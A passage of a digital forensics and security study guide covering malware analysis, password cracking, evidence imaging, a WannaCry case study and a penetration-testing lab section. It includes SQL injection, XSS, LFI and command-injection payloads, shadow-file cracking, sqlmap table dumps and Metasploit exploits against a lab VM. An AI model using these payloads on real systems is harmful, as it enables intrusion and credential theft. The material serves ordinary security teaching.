readelf -d suspicious.elf    # For ELF (Linux)

# Detect anti-analysis tricks
grep -i "IsDebuggerPresent\|CheckRemoteDebuggerPresent\|NtQueryInformationProcess" strings_output.txt
```

### 10.3 Dynamic Malware Analysis

**Analyze malware by RUNNING it (in isolated environment):**

#### Setting up Cuckoo Sandbox

```bash
# Install Cuckoo Sandbox
pip3 install cuckoo

# Initialize
cuckoo init

# Start Cuckoo
cuckoo -d

# Submit sample
cuckoo submit suspicious.exe

# View results at http://localhost:8080
```

#### Using a VM for Dynamic Analysis

```bash
# Create isolated VM in VirtualBox
# Take snapshot BEFORE running malware
# Run malware in VM
# Analyze:
#   - Process Monitor (Windows) - file/registry changes
#   - Process Hacker - running processes
#   - RegShot - registry comparison
#   - Wireshark - network activity
# Restore snapshot after analysis

# Capture network traffic during execution
sudo tcpdump -i eth0 -w malware_traffic.pcap

# Monitor system calls (Linux)
strace -f -e trace=all ./suspicious_binary 2>&1 | tee syscalls.log

# Monitor file changes
inotifywait -m -r /tmp/ -e create -e modify -e delete 2>&1 &

# Monitor process creation
auditd  # System audit daemon
ausearch -x suspicious_binary

# Network monitoring during execution
nethogs  # Network usage per process
ss -tulnp  # Open ports
```

### 10.4 Malware Analysis Tools

```bash
# YARA - Pattern matching for malware
sudo apt install yara

# Example YARA rule
cat > ransomware_detect.yar << 'EOF'
rule WannaCry_Detection {
    meta:
        description = "Detects WannaCry ransomware"
        author = "YourName"
    strings:
        $s1 = "WNcry@2ol7" ascii
        $s2 = "tasksche.exe" ascii
        $s3 = ".WNCRYPT" ascii
    condition:
        2 of them
}
EOF

# Scan with YARA rule
yara ransomware_detect.yar /path/to/scan/

# REMnux - Linux distro for malware analysis
# Download from remnux.org

# Ghidra - NSA's reverse engineering tool
# Download from ghidra-sre.org
# Open suspicious binary → Auto-analyze → Review decompiled code

# Radare2 - CLI reverse engineering
sudo apt install radare2
r2 suspicious.exe
# In r2 shell:
# aaa           → Analyze all
# afl           → List functions
# pdf @ main    → Disassemble main
# VV            → Visual mode
```

### 10.5 Forensic Analysis Steps for Malware

```
Step 1: INITIAL ASSESSMENT
   └─ Examine infected system behavior
   └─ Record symptoms: unusual CPU, network, processes

Step 2: DATA COLLECTION
   └─ Capture memory dump FIRST (volatile data)
   └─ Collect event logs
   └─ Capture network traffic
   └─ Copy suspicious files

Step 3: MALWARE IDENTIFICATION
   └─ Hash analysis via VirusTotal
   └─ String analysis
   └─ Behavior comparison with known malware

Step 4: ANALYSIS & REVERSE ENGINEERING
   └─ Static analysis (strings, PE headers)
   └─ Dynamic analysis (sandbox, monitoring)
   └─ Code analysis (Ghidra, IDA Pro)

Step 5: REPORTING
   └─ Document all findings
   └─ Create indicators of compromise (IOCs)
   └─ Develop YARA rules for detection
```

---

## 11. Encryption & Decryption in Forensics

### 11.1 Encryption Types

#### Symmetric Encryption

```
Same key for encryption AND decryption

Key → [Plaintext] → Encryption → [Ciphertext]
Key → [Ciphertext] → Decryption → [Plaintext]

Examples: AES, DES, 3DES, ChaCha20

For forensics: Find ONE key → Access everything
```

```python
# Python example: AES symmetric encryption
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64

# Encrypt
key = get_random_bytes(32)  # 256-bit key
cipher = AES.new(key, AES.MODE_GCM)
ciphertext, tag = cipher.encrypt_and_digest(b"secret data")
print(f"Encrypted: {base64.b64encode(ciphertext).decode()}")

# Decrypt (with same key)
cipher_decrypt = AES.new(key, AES.MODE_GCM, nonce=cipher.nonce)
plaintext = cipher_decrypt.decrypt(ciphertext)
print(f"Decrypted: {plaintext.decode()}")
```

#### Asymmetric Encryption

```
Different keys: Public key (encrypt) | Private key (decrypt)

Public Key → [Plaintext] → Encryption → [Ciphertext]
Private Key → [Ciphertext] → Decryption → [Plaintext]

Examples: RSA, ECC, ElGamal

For forensics: Need PRIVATE KEY to decrypt (much harder)
```

```bash
# Generate RSA key pair
openssl genrsa -out private_key.pem 2048
openssl rsa -in private_key.pem -pubout -out public_key.pem

# Encrypt with public key
openssl rsautl -encrypt -inkey public_key.pem -pubin -in plaintext.txt -out encrypted.bin

# Decrypt with private key
openssl rsautl -decrypt -inkey private_key.pem -in encrypted.bin -out decrypted.txt
```

### 11.2 Password Cracking (for own systems/testing)

```bash
# Hashcat - GPU-accelerated password cracking
sudo apt install hashcat

# Identify hash type
hashid hash.txt
# Or: hash-identifier

# Dictionary attack
hashcat -m 0 -a 0 hash.txt wordlist.txt        # MD5
hashcat -m 100 -a 0 hash.txt wordlist.txt      # SHA1
hashcat -m 1800 -a 0 hash.txt wordlist.txt     # sha512crypt (Linux)
hashcat -m 1000 -a 0 hash.txt wordlist.txt     # NTLM (Windows)

# Brute force attack
hashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l?l?l   # 8 lowercase letters

# Rule-based attack
hashcat -m 0 -a 0 hash.txt wordlist.txt -r rules/best64.rule

# John The Ripper
sudo apt install john

# Crack Linux password hashes
sudo cat /etc/shadow > shadow_copy.txt
john shadow_copy.txt

# With wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt shadow_copy.txt

# Show cracked passwords
john --show shadow_copy.txt

# Crack zip files
zip2john protected.zip > zip_hash.txt
john zip_hash.txt
```

### 11.3 Common Hashing Algorithms in Forensics

```bash
# Generate hashes
md5sum file.txt       # 128-bit, fast, NOT cryptographically secure
sha1sum file.txt      # 160-bit, deprecated for security
sha256sum file.txt    # 256-bit, recommended minimum
sha512sum file.txt    # 512-bit, most secure

# In Python
python3 -c "
import hashlib
with open('file.txt', 'rb') as f:
    data = f.read()
print('MD5:', hashlib.md5(data).hexdigest())
print('SHA1:', hashlib.sha1(data).hexdigest())
print('SHA256:', hashlib.sha256(data).hexdigest())
"

# Check hash of evidence image
sha256sum /evidence/disk.img | tee /evidence/disk.img.sha256
# Later verification:
sha256sum -c /evidence/disk.img.sha256
```

---

## 12. Hashing & Data Integrity

### 12.1 Why Hashing in Forensics?

```
Evidence hash BEFORE = Hash AFTER?
   YES → No tampering occurred ✅
   NO  → Evidence was modified ❌

This is the core of Chain of Custody!
```

### 12.2 Practical Hashing Lab

```bash
# Create test file
echo "This is evidence data" > evidence.txt

# Generate hashes
md5sum evidence.txt
sha256sum evidence.txt

# Store in a manifest file
cat > evidence_manifest.txt << EOF
File: evidence.txt
MD5: $(md5sum evidence.txt | cut -d' ' -f1)
SHA256: $(sha256sum evidence.txt | cut -d' ' -f1)
Date: $(date)
Examiner: Your Name
Case: CASE-2024-001
EOF

# Verify integrity
md5sum -c <(echo "$(cat evidence_manifest.txt | grep MD5 | cut -d' ' -f2)  evidence.txt")
```

### 12.3 CyberChef for Hash Analysis

**Online tool:** https://gchq.github.io/CyberChef/

```
Usage:
1. Go to CyberChef
2. Input: Type your text/data
3. Recipe: Add MD5 or SHA256 operation
4. Output: Get hash value

Supported operations:
- MD5, SHA1, SHA256, SHA512
- Base64 Encode/Decode
- URL Encode/Decode
- AES Encrypt/Decrypt
- XOR operations
- Much more!
```

---

## 13. Legal Aspects & Chain of Custody

### 13.1 Key Legal Principles

```
╔════════════════════════════════════════════════╗
║  CARDINAL RULE: Document EVERYTHING           ║
╚════════════════════════════════════════════════╝
```

### 13.2 Chain of Custody Documentation

```bash
# Create a chain of custody log script
cat > create_coc.sh << 'EOF'
#!/bin/bash
CASE_ID="CASE-2024-001"
EVIDENCE_ID="EV-001"
EXAMINER="Your Name"
DATE=$(date +"%Y-%m-%d %H:%M:%S")

echo "CHAIN OF CUSTODY RECORD" > coc_${CASE_ID}.txt
echo "========================" >> coc_${CASE_ID}.txt
echo "Case ID: ${CASE_ID}" >> coc_${CASE_ID}.txt
echo "Evidence ID: ${EVIDENCE_ID}" >> coc_${CASE_ID}.txt
echo "Date/Time: ${DATE}" >> coc_${CASE_ID}.txt
echo "Examiner: ${EXAMINER}" >> coc_${CASE_ID}.txt
echo "" >> coc_${CASE_ID}.txt
echo "Evidence Hash (SHA256):" >> coc_${CASE_ID}.txt
sha256sum $1 >> coc_${CASE_ID}.txt
echo "" >> coc_${CASE_ID}.txt
echo "Actions Taken:" >> coc_${CASE_ID}.txt
echo "1. $(date): Evidence received and hashed" >> coc_${CASE_ID}.txt

echo "Chain of custody created: coc_${CASE_ID}.txt"
EOF
chmod +x create_coc.sh
```

### 13.3 Write Blockers (Hardware & Software)

```bash
# Software write blocker (Linux)
# Mount device as read-only
sudo mount -o ro /dev/sdb1 /mnt/evidence

# Use udev rules to force read-only
cat > /etc/udev/rules.d/99-readonly.rules << 'EOF'
SUBSYSTEM=="block", ACTION=="add", ATTRS{removable}=="1", RUN+="/bin/sh -c 'echo 1 > /sys/block/%k/ro'"
EOF

# Verify device is read-only
cat /sys/block/sdb/ro   # Should output "1"

# Hardware write blockers (commercial):
# - Tableau Forensic Bridges (USB, SATA, SAS)
# - WiebeTech USB WriteBlocker
# - ICS Image MASSter
```

### 13.4 Legal Frameworks

| Framework               | Description                                                |
| ----------------------- | ---------------------------------------------------------- |
| **GDPR**                | EU data protection law — affects what data can be analyzed |
| **CFAA (US)**           | Computer Fraud and Abuse Act                               |
| **IT Act 2000 (India)** | Information Technology Act                                 |
| **PIPEDA (Canada)**     | Personal Information Protection                            |
| **ISO 27001**           | Information Security Management                            |
| **NIST Guidelines**     | SP 800-86: Guide to Integrating Forensic Techniques        |

---

## 14. VoIP Forensics

### 14.1 VoIP Overview

Voice over Internet Protocol (VoIP) sends voice as data packets over the network.

**Common VoIP protocols:**

- SIP (Session Initiation Protocol) — Port 5060/5061
- RTP (Real-time Transport Protocol) — Dynamic ports
- H.323 — Older standard
- MGCP — Media Gateway Control Protocol

### 14.2 VoIP Packet Capture and Analysis

```bash
# Capture VoIP traffic
sudo tcpdump -i eth0 -w voip_capture.pcap "port 5060 or portrange 10000-20000"

# Extract SIP messages
tshark -r voip_capture.pcap -Y "sip"

# Extract RTP streams (actual audio)
tshark -r voip_capture.pcap -Y "rtp"

# VoIP analysis with Wireshark
# Open pcap → Telephony → VoIP Calls → Select call → Play Streams

# sngrep — SIP message analysis tool
sudo apt install sngrep
sudo sngrep  # Live SIP capture
sngrep -I voip_capture.pcap  # Analyze pcap

# Extract audio from RTP stream
tshark -r voip_capture.pcap --export-objects "imf,/tmp/voip_output/"

# Or use VoIPmonitor
```

### 14.3 VoIP Forensics Challenges

1. **Data loss** — RTP packets can be lost (UDP-based)
2. **Encryption** — SRTP (Secure RTP) encrypts audio
3. **Lack of standards** — Different vendors implement differently
4. **NAT traversal** — Complicates source identification

---

## 15. Email Header Forensics

### 15.1 Email Header Analysis

```bash
# Install tools
sudo apt install mpack thunderbird

# Parse email headers from command line
cat email.eml | grep -E "^(From|To|Subject|Date|Received|X-Originating-IP|Message-ID):"

# Full header analysis
python3 << 'EOF'
import email
import re

# Read email file
with open('email.eml', 'r') as f:
    msg = email.message_from_file(f)

# Extract headers
print("FROM:", msg['From'])
print("TO:", msg['To'])
print("SUBJECT:", msg['Subject'])
print("DATE:", msg['Date'])
print("MESSAGE-ID:", msg['Message-ID'])

# Extract all Received headers (email path)
received = msg.get_all('Received', [])
print("\nEMAIL PATH (newest first):")
for i, header in enumerate(received):
    print(f"  Hop {i+1}: {header[:100]}...")

# Extract originating IP
x_ip = msg.get('X-Originating-IP', msg.get('X-Sender-IP', 'Not found'))
print(f"\nOriginating IP: {x_ip}")
EOF

# Online tools for email header analysis:
# https://mxtoolbox.com/EmailHeaders.aspx
# https://toolbox.googleapps.com/apps/messageheader/
# https://www.whatismyipaddress.com/email-header-analyzer
```

### 15.2 Detecting Email Spoofing

```bash
# Check SPF record
dig TXT example.com | grep "v=spf"

# Check DKIM
dig TXT selector._domainkey.example.com

# Check DMARC
dig TXT _dmarc.example.com

# Python script to verify email headers
python3 << 'EOF'
import dns.resolver
import re

def check_spf(domain):
    try:
        answers = dns.resolver.resolve(domain, 'TXT')
        for rdata in answers:
            txt = rdata.to_text()
            if 'v=spf1' in txt:
                return txt
    except:
        return "No SPF record found"

def check_dmarc(domain):
    try:
        answers = dns.resolver.resolve(f'_dmarc.{domain}', 'TXT')
        for rdata in answers:
            return rdata.to_text()
    except:
        return "No DMARC record found"

domain = "gmail.com"
print(f"SPF for {domain}: {check_spf(domain)}")
print(f"DMARC for {domain}: {check_dmarc(domain)}")
EOF
```

---

## 16. Image/Metadata Forensics

### 16.1 ExifTool Deep Dive

```bash
# Complete metadata extraction
exiftool -a -u -g1 photo.jpg

# Extract GPS coordinates and open in Google Maps
LAT=$(exiftool -GPSLatitude -n photo.jpg | awk '{print $4}')
LON=$(exiftool -GPSLongitude -n photo.jpg | awk '{print $4}')
echo "Google Maps: https://maps.google.com/?q=$LAT,$LON"

# Detect if image was edited
exiftool -Software photo.jpg          # Check editing software
exiftool -HistorySoftwareAgent photo.jpg  # Photoshop history

# Check for hidden data in EXIF
exiftool -all photo.jpg | grep -i "thumbnail\|preview"

# Extract embedded thumbnail
exiftool -b -ThumbnailImage photo.jpg > thumbnail.jpg

# Check creation vs modification dates
exiftool -FileModifyDate -FileAccessDate -FileInodeChangeDate -CreateDate photo.jpg

# Batch process
exiftool -r -csv /path/to/photos/ > all_metadata.csv
```

### 16.2 Steganography Detection

```bash
# Steghide - detect/extract hidden data in images
sudo apt install steghide

# Detect steganography
steghide info image.jpg
# Enter passphrase if prompted

# Extract hidden data (if passphrase known)
steghide extract -sf image.jpg -p "passphrase"

# StegDetect - automated steganalysis
sudo apt install stegdetect
stegdetect image.jpg

# Binwalk - detect embedded files
sudo apt install binwalk
binwalk image.jpg
binwalk --extract image.jpg  # Extract embedded files

# Strings analysis for hidden text
strings image.jpg | grep -v "^[A-Z!]" | tail -50

# Zsteg - for PNG steganography
gem install zsteg
zsteg image.png
zsteg -a image.png  # All methods

# LSB (Least Significant Bit) analysis
python3 << 'EOF'
from PIL import Image

def extract_lsb(image_path):
    img = Image.open(image_path)
    pixels = list(img.getdata())
    binary = ""
    for pixel in pixels[:100]:  # Check first 100 pixels
        for channel in pixel[:3]:  # RGB
            binary += str(channel & 1)  # LSB

    # Convert binary to text
    chars = [chr(int(binary[i:i+8], 2)) for i in range(0, len(binary)-8, 8)]
    print("LSB data:", ''.join(chars))

extract_lsb("image.png")
EOF
```

---

## 17. File Carving Techniques

### 17.1 File Signature (Magic Bytes) Reference

```
JPEG:    FF D8 FF E0 | FF D8 FF E1
PNG:     89 50 4E 47 0D 0A 1A 0A
GIF:     47 49 46 38
PDF:     25 50 44 46 (= %PDF)
ZIP:     50 4B 03 04
RAR:     52 61 72 21 1A 07
EXE:     4D 5A (= MZ)
DOC:     D0 CF 11 E0 A1 B1 1A E1
DOCX:    50 4B 03 04 (ZIP-based)
MP4:     66 74 79 70 (= ftyp at offset 4)
MP3:     49 44 33 (= ID3)
```

### 17.2 File Carving with Foremost

```bash
# Install
sudo apt install foremost

# Configure file types in /etc/foremost.conf
# Default carves: jpg, gif, png, bmp, avi, exe, mpg, wav, rif, wmv, mov, pdf, ole, doc, zip, rar, htm, cpp, etc.

# Carve from disk image
sudo foremost -t jpg,pdf,docx,zip -i disk_image.img -o /recovery/foremost_output/

# Carve everything
sudo foremost -i /dev/sdb -o /recovery/foremost_output/ -v

# Check results
ls /recovery/foremost_output/
cat /recovery/foremost_output/audit.txt
```

### 17.3 PhotoRec (File Carving)

```bash
# Install via testdisk package
sudo apt install testdisk

# Run PhotoRec
sudo photorec /dev/sdb

# Or on disk image
sudo photorec disk_image.img

# PhotoRec menu:
# 1. Select disk/image
# 2. Select partition table type
# 3. Select partition
# 4. Choose file system type
# 5. Choose whether to search whole disk or free space only
# 6. Select output directory
# 7. Search!
```

### 17.4 Scalpel (Advanced Carving)

```bash
# Install
sudo apt install scalpel

# Configure /etc/scalpel/scalpel.conf (uncomment file types you want)
# Example entries:
# jpg  y  20000000  \xff\xd8\xff\xe0\x00\x10  \xff\xd9
# pdf  y  5000000   %PDF  %%EOF

# Run carving
sudo scalpel disk_image.img -o /recovery/scalpel_output/

# Review results
ls /recovery/scalpel_output/
cat /recovery/scalpel_output/audit.txt
```

---

## 18. Forensic Imaging

### 18.1 Types of Forensic Images

```
1. DISK IMAGE (.img, .dd, .raw)
   └─ Bit-for-bit copy of entire disk
   └─ Tools: dd, dcfldd, ddrescue

2. E01 (EnCase Evidence Format)
   └─ Compressed + metadata + hash verification
   └─ Tools: EnCase, FTK Imager, ewftools

3. AFF (Advanced Forensic Format)
   └─ Open source alternative to E01
   └─ Tools: aff4, afftools

4. MEMORY IMAGE (.dmp, .mem, .lime)
   └─ RAM capture for volatile forensics
   └─ Tools: LiME, WinPmem, Volatility

5. NETWORK CAPTURE (.pcap, .pcapng)
   └─ Network traffic recording
   └─ Tools: Wireshark, tcpdump
```

### 18.2 Creating Forensic Images

```bash
# DD imaging with verification
sudo dd if=/dev/sdb bs=4096 conv=noerror,sync | \
    tee disk_image.dd | \
    md5sum > disk_image.dd.md5

# E01 format with ewftools
sudo apt install ewf-tools

# Create E01 image
ewfacquire /dev/sdb \
    -t /evidence/image \
    -e "Examiner Name" \
    -d "Evidence description" \
    -C "CASE-001" \
    -c best \
    -S 2g

# Verify E01 image
ewfverify /evidence/image.E01

# Mount E01 image
sudo ewfmount /evidence/image.E01 /mnt/ewf/
sudo mount -o ro /mnt/ewf/ewf1 /mnt/evidence/

# Memory imaging with LiME
git clone https://github.com/504ensicsLabs/LiME
cd LiME/src
make

# Load module and capture memory
sudo insmod lime.ko "path=/evidence/memory.lime format=lime"
ls -lh /evidence/memory.lime

# Analyze with Volatility
vol.py -f /evidence/memory.lime --profile=LinuxUbuntu1604x64 linux.pslist
```

---

## 19. USB Device Forensics Lab

### 19.1 Complete USB Forensics Workflow

```bash
# Step 1: Identify the device
sudo dmesg | tail -20  # After connecting USB
lsblk
sudo fdisk -l

# Step 2: Write block the device
sudo hdparm -r1 /dev/sdb

# Step 3: Hash before imaging
md5sum /dev/sdb > /evidence/usb_original_hash.md5

# Step 4: Create forensic image
sudo dcfldd if=/dev/sdb of=/evidence/usb.img \
    hash=md5 hashlog=/evidence/usb_hash.log \
    bs=512 conv=noerror,sync

# Step 5: Verify image
md5sum /evidence/usb.img

# Step 6: Analyze with Autopsy or command line
sudo mount -o ro,noatime,loop /evidence/usb.img /mnt/usb_analysis/

# Step 7: File system analysis
ls -la /mnt/usb_analysis/
find /mnt/usb_analysis/ -name "*.pdf" -o -name "*.doc" 2>/dev/null
find /mnt/usb_analysis/ -newer /tmp/timestamp_file 2>/dev/null

# Step 8: Recover deleted files
sudo foremost -i /evidence/usb.img -o /evidence/usb_recovered/

# Step 9: Check for hidden partitions
sudo gparted /evidence/usb.img  # GUI tool

# Step 10: Report
echo "USB Forensic Analysis Complete" > /evidence/usb_report.txt
cat /evidence/usb_hash.log >> /evidence/usb_report.txt
ls -la /evidence/usb_recovered/ >> /evidence/usb_report.txt
```

---

## 20. Case Study: WannaCry Ransomware

### 20.1 Overview

- **Date:** May 2017
- **Type:** Ransomware worm
- **Exploit:** EternalBlue (MS17-010) — SMB vulnerability
- **Impact:** 230,000+ computers in 150 countries
- **Ransom:** $300-600 in Bitcoin

### 20.2 Technical Details

```
INFECTION CHAIN:
EternalBlue exploit → DOUBLEPULSAR backdoor → WannaCry payload

WannaCry behavior:
1. Scan network for port 445 (SMB)
2. Exploit MS17-010 vulnerability
3. Install backdoor via DOUBLEPULSAR
4. Download and execute ransomware
5. Encrypt files with AES-128 (each file unique key)
6. Encrypt AES keys with RSA-2048
7. Display ransom note
8. Check kill switch domain (saves from propagating)
```

### 20.3 Digital Forensics Investigation Steps

```bash
# Step 1: Isolate infected systems
# Disconnect from network IMMEDIATELY

# Step 2: Capture volatile memory
sudo insmod lime.ko "path=/evidence/wannacry_memory.lime format=lime"

# Step 3: Analyze memory for WannaCry indicators
vol.py -f wannacry_memory.lime --profile=Win7SP1x64 windows.pslist | grep -i "tasksche\|mssecsvc"
vol.py -f wannacry_memory.lime --profile=Win7SP1x64 windows.netscan | grep "445\|139"
vol.py -f wannacry_memory.lime --profile=Win7SP1x64 windows.malfind

# Step 4: Check for kill switch
# WannaCry checks: http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com
# If domain resolves → WannaCry STOPS propagating
# Researchers registered the domain → stopped spread

# Step 5: Collect logs
# Windows Event Log: Event ID 4688 (Process Creation)
# Look for: tasksche.exe, mssecsvc2.0

# Step 6: File system analysis
# Encrypted files: .WCRY, .WNCRYT, .WNCRYPT extensions
find /mnt/infected_drive/ -name "*.WNCRYPT" -o -name "*.WCRY" | wc -l

# Step 7: Network forensics
tshark -r network_capture.pcap -Y "tcp.port == 445 or tcp.port == 139" | head -50

# Step 8: Recovery
# Without paying ransom, recovery is extremely difficult
# Best option: Restore from clean backup
# Wanakiwi/WanaKiwi tool could recover keys on XP/7 (specific conditions)

# Step 9: Lessons learned
# - Patch MS17-010 (KB4012212)
# - Disable SMBv1
# - Regular backups
# - Network segmentation
```

### 20.4 YARA Rules for WannaCry

```yara
rule WannaCry_Ransomware {
    meta:
        description = "Detects WannaCry ransomware"
        author = "Your Name"
        date = "2024-01-01"
        reference = "https://www.us-cert.gov/ncas/alerts/TA17-132A"

    strings:
        $s1 = "WNcry@2ol7" ascii
        $s2 = "WannaCry" ascii nocase
        $s3 = "tasksche.exe" ascii
        $s4 = ".WNCRYPT" ascii
        $s5 = "mssecsvc2.0" ascii
        $s6 = "icacls . /grant Everyone:F /T /C /Q" ascii

    condition:
        3 of them
}

rule WannaCry_Kill_Switch_Check {
    meta:
        description = "WannaCry kill switch domain check"
    strings:
        $domain = "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com" ascii
    condition:
        $domain
}
```

---

## 21. Supply Chain Attack Forensics

### 21.1 What is a Supply Chain Attack?

Attacking a target indirectly by compromising their suppliers/vendors:

```
Target Company
     ↑
     │ (uses)
Software Vendor ← ATTACKER COMPROMISES THIS
     │ (delivers malicious update)
     ↓
Target Company gets infected
```

**Famous examples:**

- SolarWinds (2020) — 18,000+ organizations affected
- NotPetya (2017) — Spread via accounting software update
- CCleaner (2017) — Malware bundled in legitimate software

### 21.2 Forensic Investigation

```bash
# Check software versions and hashes
dpkg -l | grep software_name
rpm -qi software_name
sha256sum /usr/bin/software_name > current_hash.txt

# Compare with known good hashes (from vendor)
# If different → potentially compromised

# Check for unexpected network connections from trusted software
sudo ss -tulnp | grep software_name
sudo netstat -antp | grep software_name

# Review process creation logs
sudo journalctl -u software_service --since "2024-01-01"

# Check for unusual file modifications
find /opt/software/ -newer /tmp/reference_date -type f 2>/dev/null

# Review software update logs
cat /var/log/software_update.log

# Check digital signatures
gpg --verify software.tar.gz.sig software.tar.gz
# Or for packages:
rpm --checksig software.rpm
dpkg -V software_package
```

---

## 22. Data Breach Forensics

### 22.1 Incident Response for Data Breach

```bash
# PHASE 1: CONTAINMENT (immediate)
# Isolate affected systems
sudo iptables -I INPUT -j DROP
sudo iptables -I OUTPUT -j DROP

# Change passwords immediately
passwd compromised_user

# Revoke API keys/tokens
# (depends on your system)

# PHASE 2: EVIDENCE COLLECTION
# Capture memory
sudo insmod lime.ko "path=/evidence/breach_memory.lime format=lime"

# Collect logs
sudo cp /var/log/auth.log /evidence/
sudo cp /var/log/apache2/access.log /evidence/
sudo cp /var/log/nginx/access.log /evidence/
sudo cp /var/log/syslog /evidence/

# Collect running processes
ps aux > /evidence/processes.txt
netstat -antp > /evidence/network_connections.txt
last > /evidence/login_history.txt
who > /evidence/current_users.txt

# PHASE 3: ANALYSIS
# Analyze logs for breach timeline
grep "Failed password" /evidence/auth.log | \
    awk '{print $1, $2, $3, $11}' | \
    sort | uniq -c | sort -nr > /evidence/failed_logins.txt

# Find successful logins after failed attempts (may indicate successful breach)
grep "Accepted" /evidence/auth.log

# Check for data exfiltration via network
tshark -r /evidence/network.pcap -Y "ip.dst != 192.168.0.0/24" \
    -T fields -e ip.dst -e frame.len | awk '{sum[$1]+=$2} END {for(i in sum) print sum[i], i}' | sort -nr

# Find large file transfers
tshark -r /evidence/network.pcap -T fields -e frame.len | awk '{sum+=$1} END {print "Total bytes:", sum}'

# PHASE 4: RECOVERY
# Restore from clean backup
rsync -avz /backup/clean_data/ /restored/

# PHASE 5: POST-INCIDENT
# Patch vulnerabilities
# Update firewall rules
# Enable enhanced logging
# User awareness training
```

---

## 23. Hacking Techniques for Learning

> ⚠️ **ETHICAL DISCLAIMER:** These techniques are for **educational purposes only**. Only practice on systems you own or have explicit written permission to test. Unauthorized access is illegal.

### 23.1 Reconnaissance (Information Gathering)

#### Passive Reconnaissance (no direct contact with target)

```bash
# OSINT - Open Source Intelligence
# Google Dorking
# "site:yourwebsite.com"
# "inurl:admin yourwebsite.com"
# "filetype:pdf site:yourwebsite.com"
# "intitle:index of site:yourwebsite.com"

# Shodan - internet-wide scanning (YOUR OWN SYSTEMS)
# shodan.io - search for your IP/domain

# DNS enumeration
nslookup yourwebsite.com
dig yourwebsite.com ANY
dig +short yourwebsite.com MX
dig +short yourwebsite.com NS
dig +short yourwebsite.com TXT

# Sublist3r - subdomain enumeration
sudo apt install sublist3r
sublist3r -d yourdomain.com -o subdomains.txt

# theHarvester - email, subdomain gathering
sudo apt install theharvester
theHarvester -d yourdomain.com -b all

# Whois information
whois yourdomain.com

# Certificate transparency logs
curl -s "https://crt.sh/?q=%.yourdomain.com&output=json" | jq '.[].name_value' | sort -u
```

#### Active Reconnaissance (direct contact with target — YOUR OWN SYSTEMS ONLY)

```bash
# Nmap - network scanning (your own systems)
sudo apt install nmap

# Basic scan
nmap 192.168.1.1                     # Your router IP
nmap 192.168.1.0/24                  # Your network

# Service version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Full aggressive scan
nmap -A -T4 192.168.1.100

# Stealth scan
nmap -sS 192.168.1.100

# UDP scan
nmap -sU 192.168.1.100

# Script scan (vulnerability detection)
nmap --script vuln 192.168.1.100

# Scan specific ports
nmap -p 80,443,22,21,25 192.168.1.100

# Output to file
nmap -oN scan_results.txt 192.168.1.100
nmap -oX scan_results.xml 192.168.1.100

# Web technology detection
whatweb http://yourwebsite.com

# Nikto - web server scanner
sudo apt install nikto
nikto -h http://yourwebsite.com -o nikto_results.txt
```

### 23.2 Scanning & Enumeration

```bash
# Gobuster - directory/file brute forcing (your websites)
sudo apt install gobuster

# Directory enumeration
gobuster dir -u http://yourwebsite.com -w /usr/share/wordlists/dirb/common.txt

# DNS enumeration
gobuster dns -d yourdomain.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# FFuf - web fuzzer
sudo apt install ffuf

# Directory fuzzing
ffuf -u http://yourwebsite.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Parameter fuzzing
ffuf -u "http://yourwebsite.com/page?FUZZ=value" -w wordlist.txt

# Wfuzz
wfuzz -c -w wordlist.txt --hc 404 http://yourwebsite.com/FUZZ

# SMB enumeration (Windows targets / Metasploitable)
enum4linux 192.168.x.x      # Metasploitable2 IP
smbclient -L //192.168.x.x  # List shares
rpcclient -U "" -N 192.168.x.x

# SNMP enumeration
snmpwalk -v1 -c public 192.168.x.x
onesixtyone 192.168.x.x public
```

### 23.3 Web Application Testing (Your Own Sites)

```bash
# Burp Suite - intercept and modify HTTP requests
# Download from portswigger.net (Community Edition is free)
# Set browser proxy to 127.0.0.1:8080

# OWASP ZAP - automated web scanner
sudo apt install zaproxy
zap-cli quick-scan http://yourwebsite.com
zap-cli spider http://yourwebsite.com

# sqlmap - SQL injection testing (own databases)
sudo apt install sqlmap

# Basic SQL injection test
sqlmap -u "http://yourwebsite.com/page?id=1" --dbs

# With cookies
sqlmap -u "http://yourwebsite.com/page" --cookie="session=abc123" --dbs

# Dump specific database
sqlmap -u "http://yourwebsite.com/page?id=1" -D yourdb --tables

# Dump table
sqlmap -u "http://yourwebsite.com/page?id=1" -D yourdb -T users --dump

# XSS testing
# Test payloads in your forms:
# <script>alert('XSS')</script>
# <img src=x onerror=alert('XSS')>
# '"><script>alert('XSS')</script>

# Manual SQL injection payloads
# ' OR '1'='1
# ' OR '1'='1' --
# ' OR 1=1--
# admin'--

# LFI (Local File Inclusion) testing on own app
# http://yourapp.com/page.php?file=../../../etc/passwd
# http://yourapp.com/page.php?file=php://filter/convert.base64-encode/resource=config.php

# Command injection testing
# http://yourapp.com/ping?host=127.0.0.1;id
# http://yourapp.com/ping?host=127.0.0.1&&whoami
```

### 23.4 Metasploitable2 Labs (Deliberate Vulnerable VM)

**Setup Metasploitable2:**

```bash
# Download from: https://sourceforge.net/projects/metasploitable/
# Import into VirtualBox/VMware
# Default credentials: msfadmin/msfadmin
# Default IP (check with ifconfig inside VM)

# IMPORTANT: Set Metasploitable2 to HOST-ONLY network adapter
# This ensures it's isolated from internet
```

**Exploitation exercises on Metasploitable2:**

```bash
# First, find Metasploitable2 IP
# In Metasploitable2 VM: ifconfig
# Usually: 192.168.56.101 (or similar)
TARGET="192.168.56.101"

# Start Metasploit Framework
msfconsole

# ═══════════════════════════════════════
# LAB 1: vsftpd 2.3.4 Backdoor (Port 21)
# ═══════════════════════════════════════
msf6> use exploit/unix/ftp/vsftpd_234_backdoor
msf6> set RHOSTS 192.168.56.101
msf6> exploit
# Gets shell!

# ═══════════════════════════════════════════════════
# LAB 2: Samba MS-RPC Shell Command Injection (Port 139)
# ═══════════════════════════════════════════════════
msf6> use exploit/multi/samba/usermap_script
msf6> set RHOSTS 192.168.56.101
msf6> exploit

# ═══════════════════════════════════════════════════════
# LAB 3: UnrealIRCd Backdoor (Port 6667)
# ═══════════════════════════════════════════════════════
msf6> use exploit/unix/irc/unreal_ircd_3281_backdoor
msf6> set RHOSTS 192.168.56.101
msf6> exploit

# ═══════════════════════════════════════
